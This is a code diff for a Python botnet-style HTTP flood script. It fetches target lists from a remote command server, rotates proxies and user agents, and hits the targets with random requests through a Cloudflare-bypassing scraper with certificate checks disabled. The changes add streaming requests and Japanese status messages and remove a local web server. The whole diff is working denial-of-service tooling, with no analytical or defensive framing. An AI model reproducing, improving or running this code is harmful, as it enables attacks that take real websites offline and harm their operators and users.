@@ -9,8 +9,6 @@ import os
 os.system("pip3 install -U requests[socks]")
 import requests
 global targets
-import http.server
-import socketserver
 targets = ["0"]
 import urllib3
 urllib3.disable_warnings()
@@ -39,11 +37,12 @@ def requester():
         if targets[0] == "0":continue
         target = random.choice(targets).replace("%random%",randomstr()).replace("%rand%",randomstr()).replace("%randint%",randomint()).replace("%randnum%",randomint())
         proxy = random.choice(proxylist)
-        if proxy == "":continue
+        if proxy == "":print(proxy);continue
         s = cfscrape.create_scraper()
         try:
             useragent = random.choice(useragents)
             s.headers={"User-Agent": useragent}
+            s.stream=True
             rdn = random.randint(1,7)
             if rdn == 1:
                 s.get(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
@@ -59,7 +58,6 @@ def requester():
                 s.patch(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 7:
                 s.delete(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
-            print("ok")
         except Exception as e:pass
 
 def gettargets():
@@ -67,19 +65,14 @@ def gettargets():
     global useragents
     while True:
         try:
+            print("useragentを更新中...")
             useragents = requests.get("https://raw.githubusercontent.com/akgjbneksmakelsk/uas/main/ua.txt").text.split("\n")
+            print("完了\n攻撃先一覧を取得中...")
             res = requests.get("https://anbn.attackblock.xyz/?nr&dproxy")
-            if res.status_code == 200:targets = res.text.split(",")
+            if res.status_code == 200:targets = res.text.split(",");print("完了")
         except Exception as e:pass
         time.sleep(1)
 
-def site():
-    Handler = http.server.SimpleHTTPRequestHandler
-    with socketserver.TCPServer(("", 8080), Handler) as httpd:
-        print("serving at port 8080")
-        httpd.serve_forever()
-
-threading.Thread(target=site).start()
 
 def proxyreloader():
     while True:
